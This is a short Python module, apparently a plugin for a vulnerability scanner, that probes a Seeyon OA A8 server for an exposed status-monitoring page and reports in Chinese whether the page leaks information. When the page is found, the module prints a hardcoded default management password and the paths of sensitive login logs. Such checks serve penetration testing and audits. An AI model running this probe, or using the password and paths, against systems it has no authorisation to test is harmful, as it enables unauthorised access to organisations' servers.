import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        gf = requests.get(url+'seeyon/management/status.jsp',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if 'Password' in gf.text and gf.status_code==200 :
            uia = '[+]漏洞存在\nseeyon/management/status.jsp\n默认密码：\nWLCCYBD@SEEYON\n敏感路径:\n/seeyon/logs/login.log\n/seeyon/logs/v3x.log'
        else:
            uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA A8 状态监控页面信息泄露 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)